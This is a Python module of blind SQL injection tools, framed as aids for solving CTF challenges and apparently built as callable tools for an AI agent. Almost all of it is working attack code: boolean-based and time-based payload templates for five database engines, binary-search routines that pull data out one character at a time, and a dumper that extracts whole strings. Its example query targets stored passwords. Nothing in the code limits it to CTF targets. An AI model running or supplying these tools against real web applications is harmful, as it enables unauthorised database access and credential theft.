"""
Blind SQL Injection tools for CTF solving.

Provides boolean-based and time-based blind SQL injection extraction capabilities.
"""

import json
import re
import time
from typing import Dict, List, Optional, Tuple

import requests


class BlindSqliBooleanTool:
    """
    BlindSqliBooleanTool: Extract data using boolean-based blind SQL injection.

    Uses binary search to efficiently extract character values by comparing
    response differences between true and false conditions.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/page",
          "method": "GET",
          "param": "id",
          "operation": "extract_char",         # extract_char, extract_length, or test_condition
          "true_condition": "' AND 1=1 --",    # Condition that returns true response
          "false_condition": "' AND 1=2 --",   # Condition that returns false response
          "payload_template": "' AND (SELECT ASCII(SUBSTRING(({query}),{position},1))>{value}) --",
          "query": "SELECT password FROM users LIMIT 1",
          "position": 1,                       # Character position (1-indexed)
          "data": {},                          # Additional form data
          "headers": {},                       # Optional headers
          "timeout": 10                        # Optional timeout per request
        }
    """

    name: str = "blind_sqli_boolean"
    description: str = (
        "Extract data using boolean-based blind SQL injection. Uses binary search to "
        "efficiently extract character values by comparing true/false response differences. "
        "Input must be JSON with keys: 'url' (target URL), 'method' ('GET' or 'POST'), "
        "'param' (parameter to inject), 'operation' ('extract_char', 'extract_length', "
        "or 'test_condition'), 'true_condition' (payload returning true), 'false_condition' "
        "(payload returning false), optional 'payload_template' for extraction, optional "
        "'query' (SQL query to extract from), optional 'position' (char position), "
        "optional 'data', 'headers', 'timeout'. Returns extracted data or condition result."
    )

    # Common payload templates for different databases
    PAYLOAD_TEMPLATES: Dict[str, Dict[str, str]] = {
        "mysql": {
            "char": "' AND (SELECT ASCII(SUBSTRING(({query}),{position},1))>{value}) --",
            "length": "' AND (SELECT LENGTH(({query})))>{value} --",
        },
        "postgresql": {
            "char": "' AND (SELECT ASCII(SUBSTRING(({query}),{position},1))>{value}) --",
            "length": "' AND (SELECT LENGTH(({query})))>{value} --",
        },
        "mssql": {
            "char": "' AND (SELECT ASCII(SUBSTRING(({query}),{position},1)))>{value} --",
            "length": "' AND (SELECT LEN(({query})))>{value} --",
        },
        "sqlite": {
            "char": "' AND (SELECT UNICODE(SUBSTR(({query}),{position},1)))>{value} --",
            "length": "' AND (SELECT LENGTH(({query})))>{value} --",
        },
        "oracle": {
            "char": "' AND (SELECT ASCII(SUBSTR(({query}),{position},1)) FROM dual)>{value} --",
            "length": "' AND (SELECT LENGTH(({query})) FROM dual)>{value} --",
        },
    }

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _make_request(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        form_data: Dict,
        headers: Dict,
        timeout: int,
    ) -> Tuple[Optional[requests.Response], Optional[str]]:
        """Make HTTP request with payload and return response."""
        test_data = {**form_data, param: payload}
        try:
            if method == "GET":
                resp = self.session.get(url, params=test_data, headers=headers, timeout=timeout)
            else:
                resp = self.session.post(url, data=test_data, headers=headers, timeout=timeout)
            return resp, None
        except Exception as exc:
            return None, str(exc)

    def _responses_match(
        self,
        resp1: requests.Response,
        resp2: requests.Response,
        threshold: float = 0.9,
    ) -> bool:
        """Check if two responses are similar (indicating same boolean result)."""
        # Compare status codes
        if resp1.status_code != resp2.status_code:
            return False

        # Compare content length with tolerance
        len1, len2 = len(resp1.text), len(resp2.text)
        if len1 == 0 and len2 == 0:
            return True
        if len1 == 0 or len2 == 0:
            return False

        ratio = min(len1, len2) / max(len1, len2)
        if ratio < threshold:
            return False

        return True

    def _binary_search_char(
        self,
        url: str,
        method: str,
        param: str,
        payload_template: str,
        query: str,
        position: int,
        true_response: requests.Response,
        form_data: Dict,
        headers: Dict,
        timeout: int,
    ) -> Tuple[Optional[str], List[str]]:
        """Use binary search to find ASCII value of character at position."""
        logs = []
        low, high = 32, 126  # Printable ASCII range

        while low <= high:
            mid = (low + high) // 2
            payload = payload_template.format(query=query, position=position, value=mid)

            resp, error = self._make_request(url, method, param, payload, form_data, headers, timeout)
            if error:
                logs.append(f"  Error at mid={mid}: {error}")
                return None, logs

            # If response matches true_response, condition is TRUE (char > mid)
            if self._responses_match(resp, true_response):
                logs.append(f"  ASCII>{mid}: TRUE -> char > {mid} ({chr(mid) if 32 <= mid <= 126 else '?'})")
                low = mid + 1
            else:
                logs.append(f"  ASCII>{mid}: FALSE -> char <= {mid} ({chr(mid) if 32 <= mid <= 126 else '?'})")
                high = mid - 1

        # The character is at 'low' (or low-1 if we overshot)
        if 32 <= low <= 127:
            char = chr(low)
            logs.append(f"  Found: ASCII {low} = '{char}'")
            return char, logs
        elif 32 <= high <= 126:
            char = chr(high)
            logs.append(f"  Found: ASCII {high} = '{char}'")
            return char, logs
        else:
            logs.append(f"  Could not determine character (low={low}, high={high})")
            return None, logs

    def _binary_search_length(
        self,
        url: str,
        method: str,
        param: str,
        payload_template: str,
        query: str,
        true_response: requests.Response,
        form_data: Dict,
        headers: Dict,
        timeout: int,
        max_length: int = 100,
    ) -> Tuple[Optional[int], List[str]]:
        """Use binary search to find length of query result."""
        logs = []
        low, high = 0, max_length

        while low <= high:
            mid = (low + high) // 2
            payload = payload_template.format(query=query, value=mid)

            resp, error = self._make_request(url, method, param, payload, form_data, headers, timeout)
            if error:
                logs.append(f"  Error at mid={mid}: {error}")
                return None, logs

            if self._responses_match(resp, true_response):
                logs.append(f"  LENGTH>{mid}: TRUE -> length > {mid}")
                low = mid + 1
            else:
                logs.append(f"  LENGTH>{mid}: FALSE -> length <= {mid}")
                high = mid - 1

        logs.append(f"  Found length: {low}")
        return low, logs

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[BlindSqliBooleanTool] Error: Invalid JSON input. {exc}"

        # Validate required fields
        url = data.get("url")
        if not url or not isinstance(url, str):
            return "[BlindSqliBooleanTool] Error: 'url' (string) is required."

        method = (data.get("method") or "GET").upper()
        if method not in ("GET", "POST"):
            return "[BlindSqliBooleanTool] Error: 'method' must be 'GET' or 'POST'."

        param = data.get("param")
        if not param or not isinstance(param, str):
            return "[BlindSqliBooleanTool] Error: 'param' (string) is required."

        operation = data.get("operation", "test_condition")
        if operation not in ("extract_char", "extract_length", "test_condition"):
            return "[BlindSqliBooleanTool] Error: 'operation' must be 'extract_char', 'extract_length', or 'test_condition'."

        true_condition = data.get("true_condition")
        false_condition = data.get("false_condition")
        if not true_condition or not false_condition:
            return "[BlindSqliBooleanTool] Error: 'true_condition' and 'false_condition' are required."

        form_data = data.get("data") or {}
        headers = data.get("headers") or {}
        timeout = data.get("timeout", 10)

        output_lines = [
            f"[BlindSqliBooleanTool] Boolean-Based Blind SQLi",
            "=" * 50,
            f"Target: {url}",
            f"Method: {method}",
            f"Parameter: {param}",
            f"Operation: {operation}",
            "",
        ]

        # First, establish baseline true and false responses
        output_lines.append("Establishing baseline responses...")
        output_lines.append("-" * 40)

        true_resp, error = self._make_request(
            url, method, param, true_condition, form_data, headers, timeout
        )
        if error:
            return f"[BlindSqliBooleanTool] Error getting true baseline: {error}"

        false_resp, error = self._make_request(
            url, method, param, false_condition, form_data, headers, timeout
        )
        if error:
            return f"[BlindSqliBooleanTool] Error getting false baseline: {error}"

        output_lines.append(f"True condition response: Status={true_resp.status_code}, Length={len(true_resp.text)}")
        output_lines.append(f"False condition response: Status={false_resp.status_code}, Length={len(false_resp.text)}")

        # Check if we can distinguish true from false
        if self._responses_match(true_resp, false_resp):
            output_lines.append("")
            output_lines.append("WARNING: True and false responses are too similar to distinguish!")
            output_lines.append("Try different conditions or use time-based blind SQLi instead.")
            return "\n".join(output_lines)

        output_lines.append("Baseline established - responses are distinguishable.")
        output_lines.append("")

        if operation == "test_condition":
            # Just test if conditions work
            output_lines.append("RESULT: Boolean injection conditions are working.")
            output_lines.append("")
            output_lines.append("NEXT STEPS:")
            output_lines.append("  1. Use operation='extract_length' to find data length")
            output_lines.append("  2. Use operation='extract_char' to extract characters")
            output_lines.append("")
            output_lines.append("EXAMPLE PAYLOAD TEMPLATES (by database):")
            for db, templates in self.PAYLOAD_TEMPLATES.items():
                output_lines.append(f"  {db.upper()}:")
                output_lines.append(f"    char: {templates['char']}")
                output_lines.append(f"    length: {templates['length']}")

        elif operation == "extract_length":
            query = data.get("query")
            if not query:
                return "[BlindSqliBooleanTool] Error: 'query' is required for extract_length operation."

            payload_template = data.get("payload_template")
            if not payload_template:
                # Try to use a default template
                payload_template = self.PAYLOAD_TEMPLATES["mysql"]["length"]

            max_length = data.get("max_length", 100)

            output_lines.append(f"Extracting length of: {query}")
            output_lines.append(f"Using template: {payload_template}")
            output_lines.append("-" * 40)

            length, logs = self._binary_search_length(
                url, method, param, payload_template, query,
                true_resp, form_data, headers, timeout, max_length
            )

            output_lines.extend(logs)
            output_lines.append("")

            if length is not None:
                output_lines.append(f"RESULT: Length = {length}")
            else:
                output_lines.append("RESULT: Could not determine length.")

        elif operation == "extract_char":
            query = data.get("query")
            if not query:
                return "[BlindSqliBooleanTool] Error: 'query' is required for extract_char operation."

            position = data.get("position", 1)
            payload_template = data.get("payload_template")
            if not payload_template:
                payload_template = self.PAYLOAD_TEMPLATES["mysql"]["char"]

            output_lines.append(f"Extracting character at position {position}")
            output_lines.append(f"Query: {query}")
            output_lines.append(f"Using template: {payload_template}")
            output_lines.append("-" * 40)

            char, logs = self._binary_search_char(
                url, method, param, payload_template, query, position,
                true_resp, form_data, headers, timeout
            )

            output_lines.extend(logs)
            output_lines.append("")

            if char is not None:
                output_lines.append(f"RESULT: Character at position {position} = '{char}' (ASCII {ord(char)})")
            else:
                output_lines.append(f"RESULT: Could not extract character at position {position}.")

        return "\n".join(output_lines)


class BlindSqliTimeTool:
    """
    BlindSqliTimeTool: Extract data using time-based blind SQL injection.

    Uses SQL SLEEP/WAITFOR/pg_sleep functions to infer boolean conditions
    based on response timing.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/page",
          "method": "GET",
          "param": "id",
          "operation": "detect",               # detect, extract_char, or extract_length
          "db_type": "mysql",                  # mysql, postgresql, mssql, sqlite, oracle
          "delay": 3,                          # Seconds to sleep for true conditions
          "query": "SELECT password FROM users LIMIT 1",
          "position": 1,                       # Character position for extraction
          "prefix": "'",                       # SQL prefix
          "suffix": " --",                     # SQL suffix
          "data": {},                          # Additional form data
          "headers": {},                       # Optional headers
          "timeout": 15                        # Request timeout (should be > delay)
        }
    """

    name: str = "blind_sqli_time"
    description: str = (
        "Extract data using time-based blind SQL injection. Uses SQL SLEEP functions "
        "to infer boolean conditions based on response timing. Input must be JSON with "
        "keys: 'url' (target URL), 'method' ('GET' or 'POST'), 'param' (parameter to "
        "inject), 'operation' ('detect', 'extract_char', or 'extract_length'), "
        "'db_type' ('mysql', 'postgresql', 'mssql', 'sqlite', 'oracle'), optional "
        "'delay' (seconds, default 3), optional 'query' (SQL query for extraction), "
        "optional 'position' (char position), optional 'prefix'/'suffix', optional "
        "'data', 'headers', 'timeout'. Returns timing analysis or extracted data."
    )

    # Time-based injection templates by database
    TIME_TEMPLATES: Dict[str, Dict[str, str]] = {
        "mysql": {
            "detect": "{prefix} AND SLEEP({delay}){suffix}",
            "char": "{prefix} AND IF((SELECT ASCII(SUBSTRING(({query}),{position},1))>{value}),SLEEP({delay}),0){suffix}",
            "length": "{prefix} AND IF((SELECT LENGTH(({query})))>{value},SLEEP({delay}),0){suffix}",
        },
        "postgresql": {
            "detect": "{prefix}; SELECT pg_sleep({delay}){suffix}",
            "char": "{prefix} AND CASE WHEN (SELECT ASCII(SUBSTRING(({query}),{position},1))>{value}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END{suffix}",
            "length": "{prefix} AND CASE WHEN (SELECT LENGTH(({query}))>{value}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END{suffix}",
        },
        "mssql": {
            "detect": "{prefix}; WAITFOR DELAY '0:0:{delay}'{suffix}",
            "char": "{prefix}; IF (SELECT ASCII(SUBSTRING(({query}),{position},1)))>{value} WAITFOR DELAY '0:0:{delay}'{suffix}",
            "length": "{prefix}; IF (SELECT LEN(({query})))>{value} WAITFOR DELAY '0:0:{delay}'{suffix}",
        },
        "sqlite": {
            "detect": "{prefix} AND (SELECT {delay} FROM (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))))",
            "char": "{prefix} AND CASE WHEN (SELECT UNICODE(SUBSTR(({query}),{position},1)))>{value} THEN (SELECT {delay} FROM (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2)))))) ELSE 1 END{suffix}",
            "length": "{prefix} AND CASE WHEN (SELECT LENGTH(({query})))>{value} THEN (SELECT {delay} FROM (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2)))))) ELSE 1 END{suffix}",
        },
        "oracle": {
            "detect": "{prefix} AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) ELSE 1 END FROM dual){suffix}",
            "char": "{prefix} AND 1=(SELECT CASE WHEN (SELECT ASCII(SUBSTR(({query}),{position},1)) FROM dual)>{value} THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) ELSE 1 END FROM dual){suffix}",
            "length": "{prefix} AND 1=(SELECT CASE WHEN (SELECT LENGTH(({query})) FROM dual)>{value} THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) ELSE 1 END FROM dual){suffix}",
        },
    }

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _timed_request(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        form_data: Dict,
        headers: Dict,
        timeout: int,
    ) -> Tuple[float, Optional[int], Optional[str]]:
        """Make HTTP request and return (elapsed_time, status_code, error)."""
        test_data = {**form_data, param: payload}
        start_time = time.time()
        try:
            if method == "GET":
                resp = self.session.get(url, params=test_data, headers=headers, timeout=timeout)
            else:
                resp = self.session.post(url, data=test_data, headers=headers, timeout=timeout)
            elapsed = time.time() - start_time
            return elapsed, resp.status_code, None
        except requests.exceptions.Timeout:
            elapsed = time.time() - start_time
            return elapsed, None, "timeout"
        except Exception as exc:
            elapsed = time.time() - start_time
            return elapsed, None, str(exc)

    def _is_delayed(self, elapsed: float, delay: float, threshold: float = 0.8) -> bool:
        """Check if response was delayed (indicating true condition)."""
        return elapsed >= (delay * threshold)

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[BlindSqliTimeTool] Error: Invalid JSON input. {exc}"

        # Validate required fields
        url = data.get("url")
        if not url or not isinstance(url, str):
            return "[BlindSqliTimeTool] Error: 'url' (string) is required."

        method = (data.get("method") or "GET").upper()
        if method not in ("GET", "POST"):
            return "[BlindSqliTimeTool] Error: 'method' must be 'GET' or 'POST'."

        param = data.get("param")
        if not param or not isinstance(param, str):
            return "[BlindSqliTimeTool] Error: 'param' (string) is required."

        operation = data.get("operation", "detect")
        if operation not in ("detect", "extract_char", "extract_length"):
            return "[BlindSqliTimeTool] Error: 'operation' must be 'detect', 'extract_char', or 'extract_length'."

        db_type = data.get("db_type", "mysql").lower()
        if db_type not in self.TIME_TEMPLATES:
            return f"[BlindSqliTimeTool] Error: 'db_type' must be one of: {', '.join(self.TIME_TEMPLATES.keys())}."

        delay = data.get("delay", 3)
        prefix = data.get("prefix", "'")
        suffix = data.get("suffix", " --")
        form_data = data.get("data") or {}
        headers = data.get("headers") or {}
        timeout = data.get("timeout", delay + 10)

        templates = self.TIME_TEMPLATES[db_type]

        output_lines = [
            f"[BlindSqliTimeTool] Time-Based Blind SQLi",
            "=" * 50,
            f"Target: {url}",
            f"Method: {method}",
            f"Parameter: {param}",
            f"Operation: {operation}",
            f"Database Type: {db_type}",
            f"Delay: {delay}s",
            "",
        ]

        # Get baseline timing (no injection)
        output_lines.append("Getting baseline timing...")
        baseline_elapsed, baseline_status, baseline_error = self._timed_request(
            url, method, param, "1", form_data, headers, timeout
        )
        if baseline_error:
            output_lines.append(f"Baseline error: {baseline_error}")
        else:
            output_lines.append(f"Baseline: {baseline_elapsed:.2f}s (status: {baseline_status})")
        output_lines.append("")

        if operation == "detect":
            # Test if time-based injection works
            output_lines.append("Testing time-based injection...")
            output_lines.append("-" * 40)

            payload = templates["detect"].format(
                prefix=prefix, suffix=suffix, delay=delay
            )
            output_lines.append(f"Payload: {payload}")

            elapsed, status, error = self._timed_request(
                url, method, param, payload, form_data, headers, timeout
            )

            if error == "timeout":
                output_lines.append(f"Response: TIMEOUT after {elapsed:.2f}s")
                output_lines.append("")
                output_lines.append("RESULT: Time-based injection DETECTED!")
                output_lines.append(f"  Response took >{timeout}s indicating successful SLEEP")
            elif error:
                output_lines.append(f"Response: Error - {error}")
                output_lines.append("")
                output_lines.append("RESULT: Could not determine - request error")
            elif self._is_delayed(elapsed, delay):
                output_lines.append(f"Response: {elapsed:.2f}s (status: {status})")
                output_lines.append("")
                output_lines.append("RESULT: Time-based injection DETECTED!")
                output_lines.append(f"  Response took {elapsed:.2f}s (expected ~{delay}s delay)")
            else:
                output_lines.append(f"Response: {elapsed:.2f}s (status: {status})")
                output_lines.append("")
                output_lines.append("RESULT: Time-based injection NOT detected")
                output_lines.append(f"  Response was fast ({elapsed:.2f}s), no delay observed")
                output_lines.append("  Try different db_type or prefix/suffix")

        elif operation == "extract_length":
            query = data.get("query")
            if not query:
                return "[BlindSqliTimeTool] Error: 'query' is required for extract_length operation."

            max_length = data.get("max_length", 50)

            output_lines.append(f"Extracting length of: {query}")
            output_lines.append(f"Using {db_type} template with {delay}s delay")
            output_lines.append("-" * 40)

            # Binary search for length
            low, high = 0, max_length
            while low <= high:
                mid = (low + high) // 2
                payload = templates["length"].format(
                    prefix=prefix, suffix=suffix, delay=delay, query=query, value=mid
                )

                elapsed, status, error = self._timed_request(
                    url, method, param, payload, form_data, headers, timeout
                )

                if error and error != "timeout":
                    output_lines.append(f"  LENGTH>{mid}: Error - {error}")
                    break

                is_true = self._is_delayed(elapsed, delay) or error == "timeout"
                if is_true:
                    output_lines.append(f"  LENGTH>{mid}: TRUE ({elapsed:.2f}s) -> length > {mid}")
                    low = mid + 1
                else:
                    output_lines.append(f"  LENGTH>{mid}: FALSE ({elapsed:.2f}s) -> length <= {mid}")
                    high = mid - 1

            output_lines.append("")
            output_lines.append(f"RESULT: Length = {low}")

        elif operation == "extract_char":
            query = data.get("query")
            if not query:
                return "[BlindSqliTimeTool] Error: 'query' is required for extract_char operation."

            position = data.get("position", 1)

            output_lines.append(f"Extracting character at position {position}")
            output_lines.append(f"Query: {query}")
            output_lines.append("-" * 40)

            # Binary search for ASCII value
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                payload = templates["char"].format(
                    prefix=prefix, suffix=suffix, delay=delay, query=query,
                    position=position, value=mid
                )

                elapsed, status, error = self._timed_request(
                    url, method, param, payload, form_data, headers, timeout
                )

                if error and error != "timeout":
                    output_lines.append(f"  ASCII>{mid}: Error - {error}")
                    break

                is_true = self._is_delayed(elapsed, delay) or error == "timeout"
                if is_true:
                    output_lines.append(f"  ASCII>{mid}: TRUE ({elapsed:.2f}s) -> char > '{chr(mid)}'")
                    low = mid + 1
                else:
                    output_lines.append(f"  ASCII>{mid}: FALSE ({elapsed:.2f}s) -> char <= '{chr(mid)}'")
                    high = mid - 1

            if 32 <= low <= 127:
                char = chr(low)
                output_lines.append("")
                output_lines.append(f"RESULT: Character at position {position} = '{char}' (ASCII {low})")
            else:
                output_lines.append("")
                output_lines.append(f"RESULT: Could not determine character (bounds: {low}-{high})")

        return "\n".join(output_lines)


class SqliDataDumper:
    """
    SqliDataDumper: High-level tool for extracting complete strings using blind SQLi.

    Orchestrates multiple character extractions to retrieve full data values.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/page",
          "method": "GET",
          "param": "id",
          "technique": "boolean",              # boolean or time
          "db_type": "mysql",                  # mysql, postgresql, mssql, sqlite, oracle
          "query": "SELECT password FROM users LIMIT 1",
          "max_length": 50,                    # Maximum characters to extract
          "true_condition": "' AND 1=1 --",    # For boolean technique
          "false_condition": "' AND 1=2 --",   # For boolean technique
          "delay": 3,                          # For time technique
          "prefix": "'",                       # SQL prefix
          "suffix": " --",                     # SQL suffix
          "data": {},                          # Additional form data
          "headers": {},                       # Optional headers
          "timeout": 15                        # Request timeout
        }
    """

    name: str = "sqli_data_dumper"
    description: str = (
        "Extract complete strings using blind SQL injection. Orchestrates multiple "
        "character extractions to retrieve full data values. Input must be JSON with "
        "keys: 'url' (target URL), 'method' ('GET' or 'POST'), 'param' (parameter to "
        "inject), 'technique' ('boolean' or 'time'), 'db_type' ('mysql', 'postgresql', "
        "'mssql', 'sqlite', 'oracle'), 'query' (SQL query to extract), optional "
        "'max_length' (default 50), for boolean: 'true_condition'/'false_condition', "
        "for time: 'delay', optional 'prefix'/'suffix', optional 'data', 'headers', "
        "'timeout'. Returns the fully extracted string."
    )

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()
        self.boolean_tool = BlindSqliBooleanTool(session=self.session)
        self.time_tool = BlindSqliTimeTool(session=self.session)

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[SqliDataDumper] Error: Invalid JSON input. {exc}"

        # Validate required fields
        url = data.get("url")
        if not url or not isinstance(url, str):
            return "[SqliDataDumper] Error: 'url' (string) is required."

        method = (data.get("method") or "GET").upper()
        if method not in ("GET", "POST"):
            return "[SqliDataDumper] Error: 'method' must be 'GET' or 'POST'."

        param = data.get("param")
        if not param or not isinstance(param, str):
            return "[SqliDataDumper] Error: 'param' (string) is required."

        technique = data.get("technique", "boolean")
        if technique not in ("boolean", "time"):
            return "[SqliDataDumper] Error: 'technique' must be 'boolean' or 'time'."

        query = data.get("query")
        if not query or not isinstance(query, str):
            return "[SqliDataDumper] Error: 'query' (string) is required."

        db_type = data.get("db_type", "mysql").lower()
        max_length = data.get("max_length", 50)
        form_data = data.get("data") or {}
        headers = data.get("headers") or {}
        timeout = data.get("timeout", 15)

        output_lines = [
            f"[SqliDataDumper] Full Data Extraction",
            "=" * 50,
            f"Target: {url}",
            f"Parameter: {param}",
            f"Technique: {technique}",
            f"Database: {db_type}",
            f"Query: {query}",
            f"Max Length: {max_length}",
            "",
        ]

        extracted = ""
        consecutive_nulls = 0
        max_consecutive_nulls = 3  # Stop after 3 consecutive failed extractions

        if technique == "boolean":
            # Boolean-based extraction
            true_condition = data.get("true_condition")
            false_condition = data.get("false_condition")
            if not true_condition or not false_condition:
                return "[SqliDataDumper] Error: 'true_condition' and 'false_condition' required for boolean technique."

            payload_template = data.get("payload_template")
            if not payload_template:
                templates = BlindSqliBooleanTool.PAYLOAD_TEMPLATES.get(db_type, {})
                payload_template = templates.get("char", BlindSqliBooleanTool.PAYLOAD_TEMPLATES["mysql"]["char"])

            output_lines.append("Extracting using boolean technique...")
            output_lines.append("-" * 40)

            for position in range(1, max_length + 1):
                # Prepare input for boolean tool
                char_input = {
                    "url": url,
                    "method": method,
                    "param": param,
                    "operation": "extract_char",
                    "true_condition": true_condition,
                    "false_condition": false_condition,
                    "payload_template": payload_template,
                    "query": query,
                    "position": position,
                    "data": form_data,
                    "headers": headers,
                    "timeout": timeout,
                }

                result = self.boolean_tool.use(json.dumps(char_input))

                # Parse result to find extracted character
                char_match = re.search(r"Character at position \d+ = '(.)'", result)
                if char_match:
                    char = char_match.group(1)
                    extracted += char
                    consecutive_nulls = 0
                    output_lines.append(f"  Position {position}: '{char}' -> \"{extracted}\"")
                else:
                    consecutive_nulls += 1
                    output_lines.append(f"  Position {position}: [failed to extract]")
                    if consecutive_nulls >= max_consecutive_nulls:
                        output_lines.append(f"  Stopping after {max_consecutive_nulls} consecutive failures")
                        break

        else:  # time-based
            delay = data.get("delay", 3)
            prefix = data.get("prefix", "'")
            suffix = data.get("suffix", " --")

            output_lines.append(f"Extracting using time technique (delay={delay}s)...")
            output_lines.append("-" * 40)

            for position in range(1, max_length + 1):
                # Prepare input for time tool
                char_input = {
                    "url": url,
                    "method": method,
                    "param": param,
                    "operation": "extract_char",
                    "db_type": db_type,
                    "delay": delay,
                    "query": query,
                    "position": position,
                    "prefix": prefix,
                    "suffix": suffix,
                    "data": form_data,
                    "headers": headers,
                    "timeout": timeout,
                }

                result = self.time_tool.use(json.dumps(char_input))

                # Parse result to find extracted character
                char_match = re.search(r"Character at position \d+ = '(.)'", result)
                if char_match:
                    char = char_match.group(1)
                    extracted += char
                    consecutive_nulls = 0
                    output_lines.append(f"  Position {position}: '{char}' -> \"{extracted}\"")
                else:
                    consecutive_nulls += 1
                    output_lines.append(f"  Position {position}: [failed to extract]")
                    if consecutive_nulls >= max_consecutive_nulls:
                        output_lines.append(f"  Stopping after {max_consecutive_nulls} consecutive failures")
                        break

        output_lines.append("")
        output_lines.append("=" * 50)
        output_lines.append(f"EXTRACTED DATA: \"{extracted}\"")
        output_lines.append(f"Length: {len(extracted)} characters")

        # Check for CTF flags
        flag_patterns = [
            r"(picoCTF\{[^}]+\})",
            r"(HTB\{[^}]+\})",
            r"(THM\{[^}]+\})",
            r"(FLAG\{[^}]+\})",
            r"(CTF\{[^}]+\})",
            r"(flag\{[^}]+\})",
        ]
        for pattern in flag_patterns:
            match = re.search(pattern, extracted, re.IGNORECASE)
            if match:
                output_lines.append("")
                output_lines.append(f"!!! FLAG DETECTED: {match.group(1)} !!!")
                break

        return "\n".join(output_lines)
